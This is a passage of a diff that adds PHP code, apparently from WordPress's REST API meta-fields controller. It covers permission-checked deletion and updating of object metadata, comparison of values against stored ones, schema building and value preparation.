+	 * @param string $meta_key  Key for the field.
+	 * @param string $name      Name for the field that is exposed in the REST API.
+	 * @return true|WP_Error True if meta field is deleted, WP_Error otherwise.
+	 */
+	protected function delete_meta_value( $object_id, $meta_key, $name ) {
+		$meta_type = $this->get_meta_type();
+
+		if ( ! current_user_can( "delete_{$meta_type}_meta", $object_id, $meta_key ) ) {
+			return new WP_Error(
+				'rest_cannot_delete',
+				/* translators: %s: Custom field key. */
+				sprintf( __( 'Sorry, you are not allowed to edit the %s custom field.' ), $name ),
+				array(
+					'key'    => $name,
+					'status' => rest_authorization_required_code(),
+				)
+			);
+		}
+
+		if ( null === get_metadata_raw( $meta_type, $object_id, wp_slash( $meta_key ) ) ) {
+			return true;
+		}
+
+		if ( ! delete_metadata( $meta_type, $object_id, wp_slash( $meta_key ) ) ) {
+			return new WP_Error(
+				'rest_meta_database_error',
+				__( 'Could not delete meta value from database.' ),
+				array(
+					'key'    => $name,
+					'status' => WP_Http::INTERNAL_SERVER_ERROR,
+				)
+			);
+		}
+
+		return true;
+	}
+
+	/**
+	 * Updates multiple meta values for an object.
+	 *
+	 * Alters the list of values in the database to match the list of provided values.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param int    $object_id Object ID to update.
+	 * @param string $meta_key  Key for the custom field.
+	 * @param string $name      Name for the field that is exposed in the REST API.
+	 * @param array  $values    List of values to update to.
+	 * @return true|WP_Error True if meta fields are updated, WP_Error otherwise.
+	 */
+	protected function update_multi_meta_value( $object_id, $meta_key, $name, $values ) {
+		$meta_type = $this->get_meta_type();
+
+		if ( ! current_user_can( "edit_{$meta_type}_meta", $object_id, $meta_key ) ) {
+			return new WP_Error(
+				'rest_cannot_update',
+				/* translators: %s: Custom field key. */
+				sprintf( __( 'Sorry, you are not allowed to edit the %s custom field.' ), $name ),
+				array(
+					'key'    => $name,
+					'status' => rest_authorization_required_code(),
+				)
+			);
+		}
+
+		$current_values = get_metadata( $meta_type, $object_id, $meta_key, false );
+		$subtype        = get_object_subtype( $meta_type, $object_id );
+
+		$to_remove = $current_values;
+		$to_add    = $values;
+
+		foreach ( $to_add as $add_key => $value ) {
+			$remove_keys = array_keys(
+				array_filter(
+					$current_values,
+					function ( $stored_value ) use ( $meta_key, $subtype, $value ) {
+						return $this->is_meta_value_same_as_stored_value( $meta_key, $subtype, $stored_value, $value );
+					}
+				)
+			);
+
+			if ( empty( $remove_keys ) ) {
+				continue;
+			}
+
+			if ( count( $remove_keys ) > 1 ) {
+				// To remove, we need to remove first, then add, so don't touch.
+				continue;
+			}
+
+			$remove_key = $remove_keys[0];
+
+			unset( $to_remove[ $remove_key ] );
+			unset( $to_add[ $add_key ] );
+		}
+
+		/*
+		 * `delete_metadata` removes _all_ instances of the value, so only call once. Otherwise,
+		 * `delete_metadata` will return false for subsequent calls of the same value.
+		 * Use serialization to produce a predictable string that can be used by array_unique.
+		 */
+		$to_remove = array_map( 'maybe_unserialize', array_unique( array_map( 'maybe_serialize', $to_remove ) ) );
+
+		foreach ( $to_remove as $value ) {
+			if ( ! delete_metadata( $meta_type, $object_id, wp_slash( $meta_key ), wp_slash( $value ) ) ) {
+				return new WP_Error(
+					'rest_meta_database_error',
+					/* translators: %s: Custom field key. */
+					sprintf( __( 'Could not update the meta value of %s in database.' ), $meta_key ),
+					array(
+						'key'    => $name,
+						'status' => WP_Http::INTERNAL_SERVER_ERROR,
+					)
+				);
+			}
+		}
+
+		foreach ( $to_add as $value ) {
+			if ( ! add_metadata( $meta_type, $object_id, wp_slash( $meta_key ), wp_slash( $value ) ) ) {
+				return new WP_Error(
+					'rest_meta_database_error',
+					/* translators: %s: Custom field key. */
+					sprintf( __( 'Could not update the meta value of %s in database.' ), $meta_key ),
+					array(
+						'key'    => $name,
+						'status' => WP_Http::INTERNAL_SERVER_ERROR,
+					)
+				);
+			}
+		}
+
+		return true;
+	}
+
+	/**
+	 * Updates a meta value for an object.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param int    $object_id Object ID to update.
+	 * @param string $meta_key  Key for the custom field.
+	 * @param string $name      Name for the field that is exposed in the REST API.
+	 * @param mixed  $value     Updated value.
+	 * @return true|WP_Error True if the meta field was updated, WP_Error otherwise.
+	 */
+	protected function update_meta_value( $object_id, $meta_key, $name, $value ) {
+		$meta_type = $this->get_meta_type();
+
+		if ( ! current_user_can( "edit_{$meta_type}_meta", $object_id, $meta_key ) ) {
+			return new WP_Error(
+				'rest_cannot_update',
+				/* translators: %s: Custom field key. */
+				sprintf( __( 'Sorry, you are not allowed to edit the %s custom field.' ), $name ),
+				array(
+					'key'    => $name,
+					'status' => rest_authorization_required_code(),
+				)
+			);
+		}
+
+		// Do the exact same check for a duplicate value as in update_metadata() to avoid update_metadata() returning false.
+		$old_value = get_metadata( $meta_type, $object_id, $meta_key );
+		$subtype   = get_object_subtype( $meta_type, $object_id );
+
+		if ( 1 === count( $old_value ) && $this->is_meta_value_same_as_stored_value( $meta_key, $subtype, $old_value[0], $value ) ) {
+			return true;
+		}
+
+		if ( ! update_metadata( $meta_type, $object_id, wp_slash( $meta_key ), wp_slash( $value ) ) ) {
+			return new WP_Error(
+				'rest_meta_database_error',
+				/* translators: %s: Custom field key. */
+				sprintf( __( 'Could not update the meta value of %s in database.' ), $meta_key ),
+				array(
+					'key'    => $name,
+					'status' => WP_Http::INTERNAL_SERVER_ERROR,
+				)
+			);
+		}
+
+		return true;
+	}
+
+	/**
+	 * Checks if the user provided value is equivalent to a stored value for the given meta key.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param string $meta_key     The meta key being checked.
+	 * @param string $subtype      The object subtype.
+	 * @param mixed  $stored_value The currently stored value retrieved from get_metadata().
+	 * @param mixed  $user_value   The value provided by the user.
+	 * @return bool
+	 */
+	protected function is_meta_value_same_as_stored_value( $meta_key, $subtype, $stored_value, $user_value ) {
+		$args      = $this->get_registered_fields()[ $meta_key ];
+		$sanitized = sanitize_meta( $meta_key, $user_value, $this->get_meta_type(), $subtype );
+
+		if ( in_array( $args['type'], array( 'string', 'number', 'integer', 'boolean' ), true ) ) {
+			// The return value of get_metadata will always be a string for scalar types.
+			$sanitized = (string) $sanitized;
+		}
+
+		return $sanitized === $stored_value;
+	}
+
+	/**
+	 * Retrieves all the registered meta fields.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @return array Registered fields.
+	 */
+	protected function get_registered_fields() {
+		$registered = array();
+
+		$meta_type    = $this->get_meta_type();
+		$meta_subtype = $this->get_meta_subtype();
+
+		$meta_keys = get_registered_meta_keys( $meta_type );
+		if ( ! empty( $meta_subtype ) ) {
+			$meta_keys = array_merge( $meta_keys, get_registered_meta_keys( $meta_type, $meta_subtype ) );
+		}
+
+		foreach ( $meta_keys as $name => $args ) {
+			if ( empty( $args['show_in_rest'] ) ) {
+				continue;
+			}
+
+			$rest_args = array();
+
+			if ( is_array( $args['show_in_rest'] ) ) {
+				$rest_args = $args['show_in_rest'];
+			}
+
+			$default_args = array(
+				'name'             => $name,
+				'single'           => $args['single'],
+				'type'             => ! empty( $args['type'] ) ? $args['type'] : null,
+				'schema'           => array(),
+				'prepare_callback' => array( $this, 'prepare_value' ),
+			);
+
+			$default_schema = array(
+				'type'        => $default_args['type'],
+				'description' => empty( $args['description'] ) ? '' : $args['description'],
+				'default'     => isset( $args['default'] ) ? $args['default'] : null,
+			);
+
+			$rest_args           = array_merge( $default_args, $rest_args );
+			$rest_args['schema'] = array_merge( $default_schema, $rest_args['schema'] );
+
+			$type = ! empty( $rest_args['type'] ) ? $rest_args['type'] : null;
+			$type = ! empty( $rest_args['schema']['type'] ) ? $rest_args['schema']['type'] : $type;
+
+			if ( null === $rest_args['schema']['default'] ) {
+				$rest_args['schema']['default'] = static::get_empty_value_for_type( $type );
+			}
+
+			$rest_args['schema'] = rest_default_additional_properties_to_false( $rest_args['schema'] );
+
+			if ( ! in_array( $type, array( 'string', 'boolean', 'integer', 'number', 'array', 'object' ), true ) ) {
+				continue;
+			}
+
+			if ( empty( $rest_args['single'] ) ) {
+				$rest_args['schema'] = array(
+					'type'  => 'array',
+					'items' => $rest_args['schema'],
+				);
+			}
+
+			$registered[ $name ] = $rest_args;
+		}
+
+		return $registered;
+	}
+
+	/**
+	 * Retrieves the object's meta schema, conforming to JSON Schema.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @return array Field schema data.
+	 */
+	public function get_field_schema() {
+		$fields = $this->get_registered_fields();
+
+		$schema = array(
+			'description' => __( 'Meta fields.' ),
+			'type'        => 'object',
+			'context'     => array( 'view', 'edit' ),
+			'properties'  => array(),
+			'arg_options' => array(
+				'sanitize_callback' => null,
+				'validate_callback' => array( $this, 'check_meta_is_array' ),
+			),
+		);
+
+		foreach ( $fields as $args ) {
+			$schema['properties'][ $args['name'] ] = $args['schema'];
+		}
+
+		return $schema;
+	}
+
+	/**
+	 * Prepares a meta value for output.
+	 *
+	 * Default preparation for meta fields. Override by passing the
+	 * `prepare_callback` in your `show_in_rest` options.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param mixed           $value   Meta value from the database.
+	 * @param WP_REST_Request $request Request object.
+	 * @param array           $args    REST-specific options for the meta key.
+	 * @return mixed Value prepared for output. If a non-JsonSerializable object, null.
+	 */
+	public static function prepare_value( $value, $request, $args ) {
+		if ( $args['single'] ) {
+			$schema = $args['schema'];
+		} else {
+			$schema = $args['schema']['items'];
+		}
+
+		if ( '' === $value && in_array( $schema['type'], array( 'boolean', 'integer', 'number' ), true ) ) {
+			$value = static::get_empty_value_for_type( $schema['type'] );
+		}
+
+		if ( is_wp_error( rest_validate_value_from_schema( $value, $schema ) ) ) {
+			return null;
+		}
+
+		return rest_sanitize_value_from_schema( $value, $schema );
+	}
+
+	/**
+	 * Check the 'meta' value of a request is an associative array.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param mixed           $value   The meta value submitted in the request.
+	 * @param WP_REST_Request $request Full details about the request.
+	 * @param string          $param   The parameter name.
+	 * @return array|false The meta array, if valid, false otherwise.
+	 */
+	public function check_meta_is_array( $value, $request, $param ) {
+		if ( ! is_array( $value ) ) {
+			return false;
+		}
+
+		return $value;
+	}
+
+	/**
+	 * Recursively add additionalProperties = false to all objects in a schema if no additionalProperties setting
+	 * is specified.
+	 *
+	 * This is needed to restrict properties of objects in meta values to only
+	 * registered items, as the REST API will allow additional properties by
+	 * default.
+	 *
+	 * @since 5.3.0
+	 * @deprecated 5.6.0 Use rest_default_additional_properties_to_false() instead.
+	 *
+	 * @param array $schema The schema array.
+	 * @return array
+	 */
+	protected function default_additional_properties_to_false( $schema ) {
+		_deprecated_function( __METHOD__, '5.6.0', 'rest_default_additional_properties_to_false()' );
+
+		return rest_default_additional_properties_to_false( $schema );
+	}
+
+	/**
+	 * Gets the empty value for a schema type.
+	 *
+	 * @since 5.3.0
+	 *
+	 * @param string $type The schema type.
+	 * @return mixed
+	 */
+	protected static function get_empty_value_for_type( $type ) {
+		switch ( $type ) {
+			case 'string':
+				return '';
+			case 'boolean':
+				return false;
+			case 'integer':
+				return 0;
+			case 'number':
+				return 0.0;
+			case 'array':
+			case 'object':
+				return array();
+			default:
+				return null;
+		}
+	}
+}
